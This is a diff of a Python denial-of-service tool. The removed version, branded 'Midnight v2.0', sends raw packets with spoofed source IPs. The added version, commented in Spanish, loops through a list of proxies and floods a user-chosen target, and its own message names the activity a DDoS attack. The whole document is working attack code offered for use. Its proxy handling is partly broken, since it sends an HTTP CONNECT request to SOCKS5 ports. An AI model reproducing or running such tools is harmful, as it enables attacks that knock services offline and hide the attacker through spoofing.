@@ -1,72 +1,63 @@
 import socket
-import fcntl
-import struct
 import random
-import subprocess
-import os
+import signal
 import sys
 
-def get_interface_ip(ifname):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    return socket.inet_ntoa(fcntl.ioctl(
-        s.fileno(),
-        0x8915,  # SIOCGIFADDR
-        struct.pack('256s', ifname[:15].encode())
-    )[20:24])
+# Lista de proxys SOCKS5
+proxies = [
+    ("127.0.0.1", 1080),
+    ("127.0.0.1", 1081),
+    ("127.0.0.1", 1082),
+    ("127.0.0.1", 1083),
+    ("127.0.0.1", 1084)
+]
 
-def create_virtual_interface(ip_address):
-    interface_name = f'veth{random.randint(1, 100000)}'
-    subprocess.run(['ip', 'link', 'add', interface_name, 'type', 'veth', 'peer', 'name', f'{interface_name}-peer'])
-    subprocess.run(['ip', 'addr', 'add', ip_address, 'dev', interface_name])
-    subprocess.run(['ip', 'link', 'set', interface_name, 'up'])
-    return interface_name
+# Pedimos al usuario la URL, el puerto y el peso del mensaje
+url = input("Introduce la URL del servidor: ")
+port = int(input("Introduce el puerto: "))
+message_size = int(input("Introduce el tamaño del mensaje en bytes: "))
 
-os.system("clear")
-os.system("figlet Midnight v2.0")
-print("Creado Por Santh'M & Genplat Dev, v2.0 ¡Con IP Spoof!")
-target_ip = input("Enter target IP: ")
-target_port = int(input("Enter target port: "))
-packet_size = int(input("Enter packet size (in bytes): "))
-packet_char = input("Enter packet character: ")
-sent = False
+# Función para manejar la interrupción de teclado
+def signal_handler(sig, frame):
+    print("\nDeteniendo el ataque DDoS...")
+    sys.exit(0)
 
-while not sent:
+# Registramos la función para manejar la interrupción de teclado
+signal.signal(signal.SIGINT, signal_handler)
+
+while True:
+    # Seleccionamos un proxy aleatorio de la lista
+    proxy = random.choice(proxies)
+    print("Usando proxy:", proxy)
+
     try:
-        # Create virtual interface and assign spoofed IP address
-        spoofed_ip = input("Enter spoofed IP: ")
-        interface_name = create_virtual_interface(spoofed_ip)
+        # Creamos un socket para el proxy
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(10)
+        s.connect(proxy)
+        print("Conectado a proxy:", proxy)
 
-        # Send packet using virtual interface
-        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
-            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        # Enviamos la petición de conexión al servidor
+        s.sendall(f"CONNECT {url}:{port} HTTP/1.1\r\n\r\n".encode())
 
-            source_ip = get_interface_ip(interface_name)
-            dest_ip = target_ip
+        # Recibimos la respuesta del proxy
+        response = s.recv(4096)
+        if response.decode().split()[1] != "200":
+            print("Error en la conexión:", response.decode())
+            continue
+        else:
+            print("Conexión establecida con éxito")
 
-            packet_data = packet_char.encode() * packet_size
+        # Enviamos el mensaje
+        message = b"A" * message_size
+        s.sendall(message)
 
-            # Construct IP header
-            version = 4
-            ihl = 5
-            tos = 0
-            tot_len = 20 + len(packet_data)
-            id = random.randint(0, 65535)
-            frag_off = 0
-            ttl = 255
-            protocol = socket.IPPROTO_TCP
-            check = 0
-            saddr = socket.inet_aton(source_ip)
-            daddr = socket.inet_aton(dest_ip)
-            ihl_version = (version << 4) + ihl
-            ip_header = struct.pack('!BBHHHBBH4s4s',
-                ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
+        # Recibimos la respuesta del servidor
+        response = s.recv(4096)
+        print("Respuesta del servidor:", response.decode())
 
-            # Send packet
-            s.sendto(ip_header + packet_data, (dest_ip, target_port))
-            print("Packet sent successfully.")
-            sent = True
+    except Exception as e:
+        print("Error en la conexión:", e)
 
-        # Remove virtual interface
-        subprocess.run(['ip', 'link', 'delete', interface_name])
-    except socket.error as err:
-        print(f"Socket error: {err}")
+    finally:
+        s.close()
